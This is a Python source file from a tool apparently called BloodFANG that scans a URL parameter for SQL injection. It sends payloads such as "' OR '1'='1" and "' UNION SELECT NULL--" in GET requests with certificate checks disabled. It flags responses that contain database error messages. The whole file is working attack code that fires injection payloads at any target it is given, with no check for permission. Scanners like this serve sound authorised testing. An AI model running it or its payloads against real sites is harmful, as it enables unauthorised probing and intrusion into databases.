# BloodFANG/core/fangsql.py
import requests, urllib.parse, time
from pathlib import Path

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
def _load_payloads(name, fallback):
    file = PAYLOAD_DIR / name
    try:
        if file.exists():
            lines = [l.strip() for l in file.read_text(encoding="utf-8").splitlines() if l.strip() and not l.startswith("#")]
            if lines: return lines
    except Exception: pass
    return fallback

PAYLOADS = _load_payloads("sql_payloads.txt", ["' OR '1'='1", "' UNION SELECT NULL--"])
ERROR_MARKERS = ["sql syntax","mysql","sql error","sqlite","oracle","mssql"]

def _compose(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    q.append((param, payload))
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)))

def scan_sqli(url, param, emit, stop_event=None):
    if not param: emit("[SQLi] Missing parameter."); return
    emit(f"[SQLi] Target: {url} param={param}")
    for p in PAYLOADS:
        if stop_event and stop_event.is_set(): emit("[SQLi] Stopped."); return
        target = _compose(url, param, p)
        try:
            r = requests.get(target, timeout=8, verify=False)
            emit(f"[SQLi] {r.status_code} → {target}")
            lower = r.text.lower()
            if any(e in lower for e in ERROR_MARKERS): emit(f"[SQLi] SQL error detected: {p}")
        except Exception as e: emit(f"[SQLi] Error: {e}")
        time.sleep(0.3)
    emit("[SQLi] Done.")

def scan(target, emit, stop_event=None):
    url, param = (target.split("::",1)+[""])[:2]
    scan_sqli(url, param, emit, stop_event)
